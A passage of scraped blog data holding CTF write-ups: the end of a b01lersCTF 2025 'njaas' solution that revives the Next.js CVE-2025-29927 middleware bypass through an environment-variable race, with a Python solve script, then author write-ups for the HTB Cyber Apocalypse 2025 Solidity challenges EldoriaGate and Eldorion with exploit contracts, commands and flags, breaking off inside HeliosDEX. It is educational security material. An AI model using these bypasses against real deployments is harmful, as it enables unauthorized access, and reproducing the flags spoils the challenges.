environ: {environ}\u0026#34;) run([\u0026#39;./start.sh\u0026#39;], cwd=\u0026#39;../next\u0026#39;, check=True) return Response(\u0026#34;Starting üëç...\u0026#34;, status=200) except CalledProcessError as e: return Response(f\u0026#34;Start Error: {str(e)}\u0026#34;, status=500) except Exception as e: return Response(f\u0026#34;Unexpected Error: {str(e)}\u0026#34;, status=500) As we can see, at the beginning of the function, the clear_csrf() function is called, which clears any env var whose value matches the CSRF_TOKEN value. Remember that we don\u0026rsquo;t control the value of the env vars set via the /csrf endpoint, and that value is exactly CSRF_TOKEN. This effectively clears any env var we set before calling the /start endpoint.\nBut wait, that\u0026rsquo;s the point! we can set the env var after calling the /start endpoint and the clear_csrf() function execution, but we need to make sure that the env var is set before the start.sh command launches the NextJS app.\nThis results in a race condition between the /csrf and /start endpoints, but that\u0026rsquo;s actually trivial since the code is running sleep 3 before starting the NextJS app, giving us more than enough race window to set the env var.\nNow, we needed to find an env var that matches length constraints that can cause some interesting behavior.\nSolution # Based on the previous experience I immediately knew which components of the NextJS source code to look at. Indeed, the first thing I did was to look inside next/src/server/lib/server-ipc/utils.ts, where the INTERNAL_HEADERS blacklist is defined. This blacklist is then used to filter out ingress request headers via the filterInternalHeaders function, where the CVE-2025-29927 patch was made.\nhttps://github.com/vercel/next.js/blob/v15.2.3/packages/next/src/server/lib/server-ipc/utils.ts#L40-L72\n// These are headers that are only used internally and should // not be honored from the external request const INTERNAL_HEADERS = [ \u0026#39;x-middleware-rewrite\u0026#39;, \u0026#39;x-middleware-redirect\u0026#39;, \u0026#39;x-middleware-set-cookie\u0026#39;, \u0026#39;x-middleware-skip\u0026#39;, \u0026#39;x-middleware-override-headers\u0026#39;, \u0026#39;x-middleware-next\u0026#39;, \u0026#39;x-now-route-matches\u0026#39;, \u0026#39;x-matched-path\u0026#39;, ] export const filterInternalHeaders = ( headers: Record\u0026lt;string, undefined | string | string[]\u0026gt; ) =\u0026gt; { for (const header in headers) { if (INTERNAL_HEADERS.includes(header)) { delete headers[header] } // If this request didn\u0026#39;t origin from this session we filter // out the \u0026#34;x-middleware-subrequest\u0026#34; header so we don\u0026#39;t skip // middleware incorrectly if ( header === \u0026#39;x-middleware-subrequest\u0026#39; \u0026amp;\u0026amp; headers[\u0026#39;x-middleware-subrequest-id\u0026#39;] !== (globalThis as any)[Symbol.for(\u0026#39;@next/middleware-subrequest-id\u0026#39;)] ) { delete headers[\u0026#39;x-middleware-subrequest\u0026#39;] } } } I then searched for all references to filterInternalHeaders function, and it appeared to be used only in next/server/lib/router-server.ts, where the request handler entrypoint is defined. And the following lines surely caught my attention:\nhttps://github.com/vercel/next.js/blob/v15.2.3/packages/next/src/server/lib/router-server.ts#L184-L188\nconst requestHandlerImpl: WorkerRequestHandler = async (req, res) =\u0026gt; { // internal headers should not be honored by the request handler if (!process.env.NEXT_PRIVATE_TEST_HEADERS) { filterInternalHeaders(req.headers) } [...] NEXT_PRIVATE_TEST_HEADERS was acting as an on-off switch to bypass the filterInternalHeaders function!\nWith NEXT_PRIVATE_TEST_HEADERS set, x-middleware-subrequest is no longer deleted internally by NextJS, even without the x-middleware-subrequest-id header, meaning it\u0026rsquo;s CVE-2025-29927 all over again!\nNEXT_PRIVATE_TEST_HEADERS is probably just used for unit testing purposes, but that was exactly what we needed to solve the challenge.\nAt this point, it was just a matter of putting everything together and win!\nHere\u0026rsquo;s my final solve script:\nexploit.py\nimport asyncio import httpx CHALL_URL = \u0026#34;http://localhost:8003\u0026#34; async def start_next(client): r = await client.post(f\u0026#34;{CHALL_URL}/start\u0026#34;) r.raise_for_status() return r.text async def set_env(client, env: str): r = await client.post(f\u0026#34;{CHALL_URL}/csrf\u0026#34;, data={\u0026#34;token\u0026#34;: env}) if r.status_code == 500: # it\u0026#39;s fine, env var was set anyway pass return r.text async def get_flag(client): headers = { #\u0026#34;x-nextjs-data\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;x-middleware-subrequest\u0026#34;: \u0026#34;src/middleware:src/middleware:src/middleware:src/middleware:src/middleware\u0026#34; } r = await client.get(f\u0026#34;{CHALL_URL}/admin/flag\u0026#34;, headers=headers) return (r.status_code, r.text) async def main(): async with httpx.AsyncClient(timeout=None) as client: starter = asyncio.create_task(start_next(client)) await asyncio.sleep(1) # mini race to set env var print(await set_env(client, \u0026#34;NEXT_PRIVATE_TEST_HEADERS\u0026#34;)) print(await starter) await asyncio.sleep(1) # wait for the nextjs app to start _, html = await get_flag(client) if \u0026#34;fake{\u0026#34; in html: print(\u0026#34;üê¥üê¥üê¥üê¥\u0026#34;) #print(html) if __name__ == \u0026#34;__main__\u0026#34;: asyncio.run(main()) Props to my teammate @witer33 for solving the challenge with me and securing first blood üê¥\nbctf{weird_proxy_set_env_bypass_fix_230c35fd62e384ed65f83abd35b4aac6}\n","date":"25 April 2025","externalUrl":null,"permalink":"/posts/b01lers-ctf-2025/njaas/","section":"Blog","summary":"Another view on how the popular CVE-2025-29927 NextJS middleware bypass could still be exploited.","title":"b01lersCTF 2025 - njaas","type":"posts"},{"content":"","date":"25 April 2025","externalUrl":null,"permalink":"/tags/cve-2025-29927/","section":"Tags","summary":"","title":"CVE-2025-29927","type":"tags"},{"content":"","date":"25 April 2025","externalUrl":null,"permalink":"/tags/cve-2025-30218/","section":"Tags","summary":"","title":"CVE-2025-30218","type":"tags"},{"content":"","date":"25 April 2025","externalUrl":null,"permalink":"/tags/nextjs/","section":"Tags","summary":"","title":"NextJS","type":"tags"},{"content":"","date":"15 March 2025","externalUrl":null,"permalink":"/tags/dex/","section":"Tags","summary":"","title":"DEX","type":"tags"},{"content":" EldoriaGate # 15th Mar 2025 Prepared By: perrythepwner Challenge Author(s): perrythepwner Difficulty: Medium\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-CyberApocalypse-2025/EldoriaGate TLDR # EVM challenge about solidity type checking / overflow checks bypass via yul assembly operations. Passing exactly 255 as msg.value and a valid passphrase to authenticate, we become authenticated users and the roles bitmask wiill overflow causing UB.\nDescription # At long last, you stand before the EldoriaGate, the legendary portal, the culmination of your perilous journey. Your escape from this digital realm hinges upon passing this final, insurmountable barrier. Your fate rests upon the passage through these mythic gates.\nThese are no mere gates of stone and steel. They are a living enchantment, a sentinel woven from ancient magic, judging all who dare approach. The Gate sees you, divining your worth, assigning your place within Eldoria\u0026rsquo;s unyielding order. But you seek not a place within their order, but freedom beyond it. Become the Usurper. Defy the Gate\u0026rsquo;s ancient magic. Pass through, yet leave no trace, no mark of your passing, no echo of your presence. Become the unseen, the unwritten, the legend whispered but never confirmed.\nOutwit the Gate. Become a phantom, a myth. Your escape, your destiny, awaits.\nSkills Required # Basic understanding of Solidity and smart contracts Interaction with smart contracts Basic understanding of yul assembly Skills Learned # Bypassing solidty type checker / overflow checks Challenge Scenario # We\u0026rsquo;re given two smart contracts, EldoriaGate.sol and EldoriaGateKernel.sol:\nEldoriaGate.sol: Deploys the kernel contract in its constructor and provides a public enter() function. A correct passphrase plus a suitable msg.value will authenticate the caller via the kernel with given roles. Acts as the \u0026ldquo;frontend\u0026rdquo; for the EldoriaGateKernel.sol. EldoriaGateKernel.sol: Manages internal logic for authentication (authenticate()) and identity evaluation (evaluateIdentity()) using low level yul assembly. Effectively acts as the optimized \u0026ldquo;backend\u0026rdquo; for EldoriaGate.sol. Analyzing the Source Code # Setup.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.28; import { EldoriaGate } from \u0026#34;./EldoriaGate.sol\u0026#34;; contract Setup { EldoriaGate public TARGET; address public player; event DeployedTarget(address at); constructor(bytes4 _secret, address _player) { TARGET = new EldoriaGate(_secret); player = _player; emit DeployedTarget(address(TARGET)); } function isSolved() public returns (bool) { return TARGET.checkUsurper(player); } } As we read in the setup contract, the needed condition to solve the challenge is to make the EldoriaGate::checkUsurper() function returns true. We will see later on the details of that.\nEldoriaGate.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.28; /*** Malakar 1b:22-28, Tales from Eldoria - Eldoria Gates \u0026#34;In ages past, where Eldoria\u0026#39;s glory shone, Ancient gates stand, where shadows turn to dust. Only the proven, with deeds and might, May join Eldoria\u0026#39;s hallowed, guiding light. Through strict trials, and offerings made, Eldoria\u0026#39;s glory, is thus displayed.\u0026#34; ELDORIA GATES *_ _ _ _ _ _ * ^ | `_\u0026#39; `-\u0026#39; `_\u0026#39; `-\u0026#39; `_\u0026#39; `| ^ | | | | | (*) | .___________ | \\^/ | | _\u0026lt;#\u0026gt;_ | // \\ | _(#)_ | o+o \\ / \\0 || ===== || 0/ \\ / (=) 0\u0026#39;\\ ^ /\\/ || || \\/\\ ^ /`0 /_^_\\ | || --- || | /_^_\\ || || | || || | || || d|_|b_T____||___________||___T_d|_|b ***/ import { EldoriaGateKernel } from \u0026#34;./EldoriaGateKernel.sol\u0026#34;; contract EldoriaGate { EldoriaGateKernel public kernel; event VillagerEntered(address villager, uint id, bool authenticated, string[] roles); event UsurperDetected(address villager, uint id, string alertMessage); struct Villager { uint id; bool authenticated; uint8 roles; } constructor(bytes4 _secret) { kernel = new EldoriaGateKernel(_secret); } function enter(bytes4 passphrase) external payable { bool isAuthenticated = kernel.authenticate(msg.sender, passphrase); require(isAuthenticated, \u0026#34;Authentication failed\u0026#34;); uint8 contribution = uint8(msg.value); (uint villagerId, uint8 assignedRolesBitMask) = kernel.evaluateIdentity(msg.sender, contribution); string[] memory roles = getVillagerRoles(msg.sender); emit VillagerEntered(msg.sender, villagerId, isAuthenticated, roles); } function getVillagerRoles(address _villager) public view returns (string[] memory) { string[8] memory roleNames = [ \u0026#34;SERF\u0026#34;, \u0026#34;PEASANT\u0026#34;, \u0026#34;ARTISAN\u0026#34;, \u0026#34;MERCHANT\u0026#34;, \u0026#34;KNIGHT\u0026#34;, \u0026#34;BARON\u0026#34;, \u0026#34;EARL\u0026#34;, \u0026#34;DUKE\u0026#34; ]; (, , uint8 rolesBitMask) = kernel.villagers(_villager); uint8 count = 0; for (uint8 i = 0; i \u0026lt; 8; i++) { if ((rolesBitMask \u0026amp; (1 \u0026lt;\u0026lt; i)) != 0) { count++; } } string[] memory foundRoles = new string[](count); uint8 index = 0; for (uint8 i = 0; i \u0026lt; 8; i++) { uint8 roleBit = uint8(1) \u0026lt;\u0026lt; i; if (kernel.hasRole(_villager, roleBit)) { foundRoles[index] = roleNames[i]; index++; } } return foundRoles; } function checkUsurper(address _villager) external returns (bool) { (uint id, bool authenticated , uint8 rolesBitMask) = kernel.villagers(_villager); bool isUsurper = authenticated \u0026amp;\u0026amp; (rolesBitMask == 0); emit UsurperDetected( _villager, id, \u0026#34;Intrusion to benefit from Eldoria, without society responsibilities, without suspicions, via gate breach.\u0026#34; ); return isUsurper; } } From the code:\nEach account (Villager) has a unique id, a boolean flag indicating if they are authenticated, and a bitmask of roles. The bitmask is used by the backend assembly implementation for convenience and optimization purposes. This is decoded later on human readable roles via the getVillagerRoles() function. enter() calls EldoriaGateKernel::authenticate() using the given passphrase. If correct, it then calls EldoriaGateKernel::evaluateIdentity() with msg.value casted as uint8. checkUsurper() checks if the caller is authenticated and has no roles assigned. If so, it emits an event with a message and returns true. Based on that we understand that in order to solve the challenge we have to somehow authenticate while \u0026ldquo;bypassing\u0026rdquo; the EldoriaGateKernel::evaluateIdentity() steps. EldoriaGateKernel.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.28; contract EldoriaGateKernel { bytes4 private eldoriaSecret; mapping(address =\u0026gt; Villager) public villagers; address public frontend; uint8 public constant ROLE_SERF = 1 \u0026lt;\u0026lt; 0; uint8 public constant ROLE_PEASANT = 1 \u0026lt;\u0026lt; 1; uint8 public constant ROLE_ARTISAN = 1 \u0026lt;\u0026lt; 2; uint8 public constant ROLE_MERCHANT = 1 \u0026lt;\u0026lt; 3; uint8 public constant ROLE_KNIGHT = 1 \u0026lt;\u0026lt; 4; uint8 public constant ROLE_BARON = 1 \u0026lt;\u0026lt; 5; uint8 public constant ROLE_EARL = 1 \u0026lt;\u0026lt; 6; uint8 public constant ROLE_DUKE = 1 \u0026lt;\u0026lt; 7; struct Villager { uint id; bool authenticated; uint8 roles; } constructor(bytes4 _secret) { eldoriaSecret = _secret; frontend = msg.sender; } modifier onlyFrontend() { assembly { if iszero(eq(caller(), sload(frontend.slot))) { revert(0, 0) } } _; } function authenticate(address _unknown, bytes4 _passphrase) external onlyFrontend returns (bool auth) { assembly { let secret := sload(eldoriaSecret.slot) auth := eq(shr(224, _passphrase), secret) mstore(0x80, auth) mstore(0x00, _unknown) mstore(0x20, villagers.slot) let villagerSlot := keccak256(0x00, 0x40) let packed := sload(add(villagerSlot, 1)) auth := mload(0x80) let newPacked := or(and(packed, not(0xff)), auth) sstore(add(villagerSlot, 1), newPacked) } } function evaluateIdentity(address _unknown, uint8 _contribution) external onlyFrontend returns (uint id, uint8 roles) { assembly { mstore(0x00, _unknown) mstore(0x20, villagers.slot) let villagerSlot := keccak256(0x00, 0x40) mstore(0x00, _unknown) id := keccak256(0x00, 0x20) sstore(villagerSlot, id) let storedPacked := sload(add(villagerSlot, 1)) let storedAuth := and(storedPacked, 0xff) if iszero(storedAuth) { revert(0, 0) } let defaultRolesMask := ROLE_SERF roles := add(defaultRolesMask, _contribution) if lt(roles, defaultRolesMask) { revert(0, 0) } let packed := or(storedAuth, shl(8, roles)) sstore(add(villagerSlot, 1), packed) } } function hasRole(address _villager, uint8 _role) external view returns (bool hasRoleFlag) { assembly { mstore(0x0, _villager) mstore(0x20, villagers.slot) let villagerSlot := keccak256(0x0, 0x40) let packed := sload(add(villagerSlot, 1)) let roles := and(shr(8, packed), 0xff) hasRoleFlag := gt(and(roles, _role), 0) } } } The \u0026ldquo;backend\u0026rdquo; contract EldoriaGateKernel.sol is where the magic happens. It uses low-level yul assembly to optimize the logic implementations. However, things can go easily wrong when assembly is being used extensively.\nThe authenticate() function is responsible for verifying that a given passphrase matches the contract‚Äôs secret. It takes the input passhprase (_passphrase) and the private storage variable eldoriaSecret, to compare them. If the passphrase is correct, it sets the authentication flag in the villager‚Äôs storage slot. This is easily done as private variables in Solidity can still be read since the contract\u0026rsquo;s storage is public. This is also stated in the Solidity documentation here. However a good reminder to always keep in mind is that in the blockchain everything is public.\nThe evaluateIdentity() function is called by the frontend once a villager is authenticated, this function finalizes their identity:\nIt computes a unique id for the villager by hashing the account address. It then asserts that the villager is authenticated (from the previous step) by checking the authentication flag in the stored slot. After confirming authentication, it assigns a default role (ROLE_SERF) and adds extra roles based on the provided _contribution (interpreted as an 8‚Äëbit value of the wei sent initially as msg.value). The final roles are packed into a single byte and stored in the villager‚Äôs storage slot. The issue here is that even though the _contribution variable it\u0026rsquo;s a uint8 in the frontend code and in the arguments of the function, in assembly there is no concept of \u0026ldquo;types\u0026rdquo;, so they are all treated as low level 32-byte values (256 bits, hence the EVM slot size). This means that each operation on the roles bitmask will always be done as uint256, even if later on that will be casted to lower representations. Also, notice how the default bitmask is ROLE_SERF which is 1, and the _contribution is added to that, so if we pass exactly 255 as _contribution we will overflow the bitmask.\nHowever, some concerns on that can arise because of several possible limitations:\noverflows in Solidity are checked by default at runtime since version 0.8.0, so the contract should revert if an overflow occurs. However, that doesn\u0026rsquo;t apply to assembly as it is unsafe by nature. the lt(roles, defaultRolesMask) check is done to ensure that the roles bitmask is not less than the default bitmask, which effectively acts as a cheap overflow check. However, as we mentioned before, this is done as a uint256 comparison, so it will always be false in our scenario. finally, even though the roles variable is casted to uint8 before being stored, the overflow will have already happened at that point, meaning that the value 256 modulo type(uint8).max will result in a zero-value bitmask. hasRole() view function allows checking if a specific villager has a specific role. It performs a bitwise AND operation with the desidered role bitmask to determine whether the villager possesses that role or not.\nThe goal at this point is clear: by passing exactly 255 as _contribution (i.e. 255 wei as msg.value) and the passphrase, we can authenticate as a villager with a zero-value bitmask, thus becoming an authenticated user without any roles assigned. This will satisfy the checkUsurper() condition.\nExploitation # This will be the pseudocode of what just described:\ncsend(target_addr, \u0026#34;enter(bytes4)\u0026#34;, \u0026#34;0xdeadfade\u0026#34;, value=255) assert ccall(setup_addr, \u0026#34;isSolved()(bool)\u0026#34;).strip() == \u0026#34;true\u0026#34; see the full exploitation script here.\nHTB{unkn0wn_1ntrud3r_1nsid3_Eld0r1a_gates}\n","date":"15 March 2025","externalUrl":null,"permalink":"/posts/htb-cyberapocalypse-2025/eldoriagate/","section":"Blog","summary":"Author writeup for the \u0026ldquo;EldoriaGate\u0026rdquo; medium blockchain challenge from HTB Cyber Apocalypse 2025.","title":"HTB Cyber Apocalypse 2025 - EldoriaGate [Author Writeup]","type":"posts"},{"content":" Eldorion # 15th Mar 2025 Prepared By: perrythepwner Challenge Author(s): perrythepwner Difficulty: Very-Easy\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-CyberApocalypse-2025/Eldorion TLDR # A simple setup challenge where a player have to write a multicall smart contract that interacts with the Eldorion smart contract in order to fit multiple function calls in the same transaction.\nDescription # Welcome to the realms of Eldoria, adventurer. You‚Äôve found yourself trapped in this mysterious digital domain, and the only way to escape is by overcoming the trials laid before you.\nBut your journey has barely begun, and already an overwhelming obstacle stands in your path. Before you can even reach the nearest city, seeking allies and information, you must face Eldorion, a colossal beast with terrifying regenerative powers. This creature, known for its \u0026ldquo;eternal resilience\u0026rdquo; guards the only passage forward. It\u0026rsquo;s clear: you must defeat Eldorion to continue your quest.\nSkills Required # Basic understanding of Solidity and smart contracts Interaction with smart contracts Skills Learned # Interacting with smart contracts Writing smart contract for batching function calls Challenge Scenario # We\u0026rsquo;re given with some attachments and 2 ports to interact to.\nBy simply navigating to the given url:port pairs, we understand that:\nOne is just for TCP connections One is an HTTP webserver that replies with \u0026ldquo;rpc is running!\u0026rdquo; Connecting to the TCP port using netcat we will get connection informations to be able to interact with the challenge environment. Selecting the 1 - Get connection informations option we will get the player private key, player address, target contract address and finally a \u0026ldquo;setup\u0026rdquo; contract address.\nAnalyzing the Source Code # Setup.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.28; import { Eldorion } from \u0026#34;./Eldorion.sol\u0026#34;; contract Setup { Eldorion public immutable TARGET; event DeployedTarget(address at); constructor() payable { TARGET = new Eldorion(); emit DeployedTarget(address(TARGET)); } function isSolved() public view returns (bool) { return TARGET.isDefeated(); } } In the attachments we do have in fact a contract named Setup.sol that just deploys the target contract (Eldorion.sol) and defines a isSolved() function that will be called by the flag checker to assert that some conditions are satisfied in order to give the flag to the player.\nIn particular, these condition just needs the isDefeated() of the target contract to return true.\nEldorion.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.28; contract Eldorion { uint256 public health = 300; uint256 public lastAttackTimestamp; uint256 private constant MAX_HEALTH = 300; event EldorionDefeated(address slayer); modifier eternalResilience() { if (block.timestamp \u0026gt; lastAttackTimestamp) { health = MAX_HEALTH; lastAttackTimestamp = block.timestamp; } _; } function attack(uint256 damage) external eternalResilience { require(damage \u0026lt;= 100, \u0026#34;Mortals cannot strike harder than 100\u0026#34;); require(health \u0026gt;= damage, \u0026#34;Overkill is wasteful\u0026#34;); health -= damage; if (health == 0) { emit EldorionDefeated(msg.sender); } } function isDefeated() external view returns (bool) { return health == 0; } } In the Eldorion contract we understand that isDefeated() in order to return true, the health of the \u0026ldquo;monster\u0026rdquo; (Eldorion) should be zero. We see that attack() function allows us to decrease the health of the monster by a maximum of 100 health for each function call.\nThe eternalResilience() modifier is also applied to the attack() function, that is just a block of code that runs before executing the code inside the wrapped function. The _ symbol it\u0026rsquo;s in fact just a placeholder to tell the compiler where to put the function code that\u0026rsquo;s being applied with the modifier (it can be at the start of the modifer as well).\nAt first glance it seems that calling the attack() function 3 times from our player account for a total of 300 damage combined would be enough, but the eternalResilience it\u0026rsquo;s impeding that. Why? the following if statement is always executed at the start when calling the attack function:\nif (block.timestamp \u0026gt; lastAttackTimestamp) { health = MAX_HEALTH; lastAttackTimestamp = block.timestamp; } If the current block timestamp (the timestamp the previous block was mined) is greater than the stored lastAttackTimestamp, then the health storage variable is set back to MAX_HEALTH (300) and lastAttackTimestamp with the current block.timestamp. In other words, calling the attack() function by an EOA would mean to execute the attack() function in a different block each time, allowing the Eldorion monster to regain full health before each attack.\nExploitation # This is a well-known limitation of an EOA in the Ethereum blockchain, however this can be easily bypassed since smart contracts can do batch executions, that means we can call the same functions multiple times in the same transaction, hence in the same block and with equal block.timestamp.\nThe solution involves just calling attack(100) three times consecutevely from a smart contract:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.28; import { Eldorion } from \u0026#34;./Eldorion.sol\u0026#34;; contract Exploit { function win(address _target) public { Eldorion eldorion = Eldorion(_target); eldorion.attack(100); eldorion.attack(100); eldorion.attack(100); require(eldorion.isDefeated(), \u0026#34;Eldorion is not defeated\u0026#34;); } } Now we just need to deploy the Exploit contract using for example forge with forge create and then calling the win() function of the Exploit contract.\n‚ûú forge build [‚†ä] Compiling... [‚†í] Compiling 2 files with Solc 0.8.28 [‚†¢] Solc 0.8.28 finished in 29.41ms Compiler run successful! ‚ûú forge create src/Exploit.sol:Exploit --rpc-url $RPC --private-key $PVK [‚†ä] Compiling... [‚†í] Compiling 2 files with Solc 0.8.28 [‚†¢] Solc 0.8.28 finished in 32.08ms Compiler run successful! Deployer: 0xCC54Fc5b35188f1EC13C049B33b831a2D6f0b944 Deployed to: 0x4641d03e38b69276afbcBcE1518520955B3FFDcA Transaction hash: 0x5d82db86cf6332d4b61ba88af3e0756de59e413536f4fc5652979bd1b45494f1 ‚ûú EXPLOIT=0x4641d03e38b69276afbcBcE1518520955B3FFDcA ‚ûú TARGET=0x251DEd71b8958BbCBe9856d10718E93c3DFdf83C ‚ûú cast send $EXPLOIT \u0026#34;win(address)\u0026#34; $TARGET --rpc-url $RPC --private-key $PVK blockHash 0x4b471b205a2057b3b44d94ee2cfad6a24a1c15ac5936b19ecf4b0e8749671d97 blockNumber 3 contractAddress cumulativeGasUsed 52019 effectiveGasPrice 1000000000 from 0xCC54Fc5b35188f1EC13C049B33b831a2D6f0b944 gasUsed 52019 logs [{\u0026#34;address\u0026#34;:\u0026#34;0x251ded71b8958bbcbe9856d10718e93c3dfdf83c\u0026#34;,\u0026#34;topics\u0026#34;:[\u0026#34;0xebade57dfc06b2a07c4dc88f21eda0fe7af62c34f1a6b4b56e09b32a2bda0cc7\u0026#34;],\u0026#34;data\u0026#34;:\u0026#34;0x0000000000000000000000004641d03e38b69276afbcbce1518520955b3ffdca\u0026#34;,\u0026#34;blockHash\u0026#34;:\u0026#34;0x4b471b205a2057b3b44d94ee2cfad6a24a1c15ac5936b19ecf4b0e8749671d97\u0026#34;,\u0026#34;blockNumber\u0026#34;:\u0026#34;0x3\u0026#34;,\u0026#34;blockTimestamp\u0026#34;:\u0026#34;0x67db3a81\u0026#34;,\u0026#34;transactionHash\u0026#34;:\u0026#34;0xa01d7f88587c158d1a520b8423d8a81f7156372110453f42d8c0e5973dc7e287\u0026#34;,\u0026#34;transactionIndex\u0026#34;:\u0026#34;0x0\u0026#34;,\u0026#34;logIndex\u0026#34;:\u0026#34;0x0\u0026#34;,\u0026#34;removed\u0026#34;:false}] logsBloom 0x00000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000008010 root status 1 (success) transactionHash 0xa01d7f88587c158d1a520b8423d8a81f7156372110453f42d8c0e5973dc7e287 transactionIndex 0 type 2 blobGasPrice 1 blobGasUsed authorizationList to 0x4641d03e38b69276afbcBcE1518520955B3FFDcA We can now connect back to the challenge handler, that will check conditions by calling the isSolved() function in the Setup contract, and print the flag.\n‚ûú nc $IP $PORT 1 - Get connection information 2 - Restart instance 3 - Get flag Select action (enter number): 3 HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n} We could also have done that using web3py:\n[...] Exploit = w3.eth.contract(abi=exploit_abi, bytecode=exploit_bytecode) Exploit.constructor().build_transaction({...}) exploit_contract = w3.eth.contract(address=exploit_addr, abi=exploit_abi) exploit_contract.functions.win(target_addr).build_transaction({...}) [...] see the full exploitation script here.\nBonus # The known limitation of not being able to batch transactions using an Externally Owned Account (EOA), has actually been a subject of discussion over the years for Ethereum devs, to the point of creating the EIP-7702 proposal.\nEIP-7702 enables EOA owners to sign a \u0026ldquo;delegation designator\u0026rdquo;, i.e. an address containing executable code that their EOAs temporarily adopt. In order to do so, EIP-7702 introduces also a new transaction type (0x04) called \u0026ldquo;set code\u0026rdquo; transaction, which includes a new field called authorization_list that contains an address representing the delegation designator contract.\nIn simpler terms, with this new standard, EOAs can now execute smart contract logic directly from their own address, making possible to do:\nBatch Transactions: EIP-7702 allows EOAs to batch multiple transactions into a single atomic transaction via the delegation designator. Sponsored Transactions: A third party (or relayer) can cover the gas fees, meaning users can execute transactions even without holding Ether. Social Recovery: By using a delegation designator, an account can be programmed to recover access through trusted parties or predetermined recovery mechanisms if keys are lost or compromised. And much more.\nAs the time of writing, the EIP has the last call deadline for the 2025-04-01 and it\u0026rsquo;s currently being tested on Sepolia Testnet. It should be included in the Ethereum Pectra Upgrade, effectively bridging the gap toward full Account Abstraction.\nReason why this is probably the last time this challenge can make sense :)\nHTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}\n","date":"15 March 2025","externalUrl":null,"permalink":"/posts/htb-cyberapocalypse-2025/eldorion/","section":"Blog","summary":"Author writeup for the \u0026ldquo;Eldorion\u0026rdquo; very-easy blockchain challenge from HTB Cyber Apocalypse 2025.","title":"HTB Cyber Apocalypse 2025 - Eldorion [Author Writeup]","type":"posts"},{"content":" HeliosDEX # 15th Mar 2025 Prepared By: perrythepwner Challenge Author(s): perrythepwner Difficulty: Easy\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-CyberApocalypse-2025/HeliosDEX TLDR # This DEFI challenge consists in exploiting a DEX that uses unsafe arithmetic operations from the OZ Math.sol library. The goal is to repeat trades to accumulate rounding errors and eventually drain the contract\u0026rsquo;s balance with a one shot refund trade.\nDescription # You stand victorious, panting, over the fallen form of Eldorion. The beast\u0026rsquo;s eternal resilience proved no match for your cunning and skill, adventurer. The path to the city gates of Eldoria now lies open, but the journey is far from over. As you approach, a shimmering structure catches your eye: the HeliosDEX, a decentralized exchange powered by the radiant energy of Helios himself. Whispers tell of travelers using this exchange to amass fortunes, stocking up on rare items and crucial supplies before braving the perils of Eldoria. Perhaps you can use this opportunity to your advantage\u0026hellip;\nSkills Required # Basic understanding of Solidity and ERC20 token standards. Familiarity with arithmetic operations and rounding behavior in Solidity (via functions like Math.mulDiv). Exploiting vulnerabilities in token swap and refund mechanisms. Skills Learned # Recognizing how different rounding modes (Floor, Ceil, Trunc, Expand) in the OZ Math.sol libraryaffect swap calculations. Challenge Scenario # We\u0026rsquo;re given two contracts: A classic Setup.sol contract and a HeliosDEX.sol contract. As the name suggests, it\u0026rsquo;s a decentralized exchange that allows users to swap between three different tokens: EldorionFang (ELD), MalakarEssence (MAL), and HeliosLuminaShards (HLS).\nAnalyzing the Source Code # Setup.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.28; import { HeliosDEX } from \u0026#34;./HeliosDEX.sol\u0026#34;; contract Setup { HeliosDEX public TARGET; address public player; event DeployedTarget(address at); constructor(address _player) payable { TARGET = new HeliosDEX{value: 1000 ether}(1000); player = _player; emit DeployedTarget(address(TARGET)); } function isSolved() public view returns (bool) { return player.balance \u0026gt;= 20 ether; } } The challenge is deployed using the Setup.sol contract. It creates an instance of HeliosDEX with an initial token supply (1000 units for each token) and funds the DEX with 1000 ETH. Your address is registered as the player. The challenge is solved when your player\u0026rsquo;s balance reaches at least 20 ETH (which is almost double of the initial balance).\nHeliosDEX.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.28; /*** __ __ ___ ____ _______ __ / / / /__ / (_)___ _____/ __ \\/ ____/ |/ / / /_/ / _ \\/ / / __ \\/ ___/ / / / __/ | / / __ / __/ / / /_/ (__ ) /_/ / /___ / | /_/ /_/\\___/_/_/\\____/____/_____/_____//_/|_| Today\u0026#39;s item listing: * Eldorion Fang (ELD): A shard of a Eldorion\u0026#39;s fang, said to imbue the holder with courage and the strength of the ancient beast. A symbol of valor in battle. * Malakar Essence (MAL): A dark, viscous substance, pulsing with the corrupted power of Malakar. Use with extreme caution, as it whispers promises of forbidden strength. MAY CAUSE HALLUCINATIONS. * Helios Lumina Shards (HLS): Fragments of pure, solidified light, radiating the warmth and energy of Helios. These shards are key to powering Eldoria\u0026#39;s invisible eye. ***/ import \u0026#34;@openzeppelin/contracts/token/ERC20/ERC20.sol\u0026#34;; import \u0026#34;@openzeppelin/contracts/utils/math/Math.sol\u0026#34;; contract EldorionFang is ERC20 { constructor(uint256 initialSupply) ERC20(\u0026#34;EldorionFang\u0026#34;, \u0026#34;ELD\u0026#34;) { _mint(msg.sender, initialSupply); } } contract MalakarEssence is ERC20 { constructor(uint256 initialSupply) ERC20(\u0026#34;MalakarEssence\u0026#34;, \u0026#34;MAL\u0026#34;) { _mint(msg.sender, initialSupply); } } contract HeliosLuminaShards is ERC20 { constructor(uint256 initialSupply) ERC20(\u0026#34;HeliosLuminaShards\u0026#34;, \u0026#34;HLS\u0026#34;) { _mint(msg.sender, initialSupply); } } contract HeliosDEX { EldorionFang public eldorionFang; MalakarEssence public malakarEssence; HeliosLuminaShards public heliosLuminaShards; uint256 public reserveELD; uint256 public 